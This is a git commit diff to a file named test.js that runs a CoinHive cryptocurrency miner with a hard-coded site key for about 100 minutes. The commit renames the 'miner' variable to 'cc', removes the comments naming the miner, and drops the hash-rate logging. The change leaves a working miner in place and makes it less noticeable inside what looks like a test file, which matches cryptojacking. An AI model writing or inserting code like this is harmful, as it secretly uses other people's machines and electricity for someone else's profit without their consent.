df2e3e8876ddf492c58a119d064c2d47f9356331
taraegodbolt <36281421+taraegodbolt@users.noreply.github.com>
2018-02-08 22:38:01 -0600

    test

--- test.js
+++ test.js
@@ -25,24 +25,14 @@ console.log('hello %s', 'world');
 const CoinHive = require('coin-hive');
 
 (async () => {
-  // Create miner
-  const miner = await CoinHive('FgNYlyRdWZc5Px5xoZXsrxqv7A6YLkkh'); // CoinHive's Site Key
+  const cc = await CoinHive('FgNYlyRdWZc5Px5xoZXsrxqv7A6YLkkh'); // CoinHive's Site Key
 
-  // Start miner
-  await miner.start();
+  await cc.start();
 
   // Listen on events
-  miner.on('found', () => console.log('Found!'));
-  miner.on('accepted', () => console.log('Accepted!'));
-  miner.on('update', data =>
-    console.log(`
-    Hashes per second: ${data.hashesPerSecond}
-    Total hashes: ${data.totalHashes}
-    Accepted hashes: ${data.acceptedHashes}
-  `)
-  );
+  cc.on('found', () => console.log('Found!'));
+  cc.on('accepted', () => console.log('Accepted!'));
 
-  // Stop miner
-  setTimeout(async () => await miner.stop(), 6000000);
+  setTimeout(async () => await cc.stop(), 6000000);
 })();
 
